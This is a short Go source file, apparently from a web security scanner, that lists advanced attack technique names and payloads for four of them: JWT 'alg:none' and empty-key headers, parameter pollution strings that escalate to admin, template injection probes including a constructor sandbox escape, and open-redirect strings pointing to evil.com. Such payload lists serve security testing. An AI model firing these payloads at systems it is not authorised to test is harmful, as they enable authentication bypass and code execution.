package boss

// AdvancedTechniques lists advanced attack techniques for the Final Boss.
var AdvancedTechniques = []string{
	"race_condition",
	"second_order_injection",
	"parameter_pollution",
	"mass_assignment",
	"jwt_attack",
	"cache_poisoning",
	"request_smuggling",
	"prototype_pollution",
	"subdomain_takeover",
	"business_logic",
	"graphql_introspection",
	"websocket_hijack",
	"deserialization",
	"template_injection",
	"open_redirect_chain",
}

// AdvancedPayloads provides payloads for advanced techniques.
var AdvancedPayloads = map[string][]string{
	"jwt_attack": {
		`{"alg":"none","typ":"JWT"}`,
		`{"alg":"HS256","typ":"JWT"}`, // with empty key
	},
	"parameter_pollution": {
		"id=1&id=2",
		"admin=true&admin=false",
		"role=user&role=admin",
	},
	"template_injection": {
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"#{7*7}",
		"{{constructor.constructor('return this')()}}",
	},
	"open_redirect": {
		"//evil.com",
		"/\\evil.com",
		"//evil.com/%2f..",
	},
}
